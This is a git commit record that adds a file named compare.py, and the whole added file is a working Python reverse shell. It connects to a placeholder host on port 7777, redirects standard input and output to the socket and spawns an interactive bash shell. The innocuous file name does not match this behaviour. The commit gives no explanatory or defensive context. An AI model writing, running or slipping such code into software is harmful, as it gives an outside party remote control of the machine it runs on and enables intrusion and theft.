89630f6f8731c6b4cf057161980200ad40d608e0
AssassinUKG <more4money@gmail.com>
2021-03-01 00:37:23 +0000

    Create compare.py

---
+++ compare.py
@@ -0,0 +1,7 @@
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("<<IPADDRESS>>",7777))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty; pty.spawn("/bin/bash")
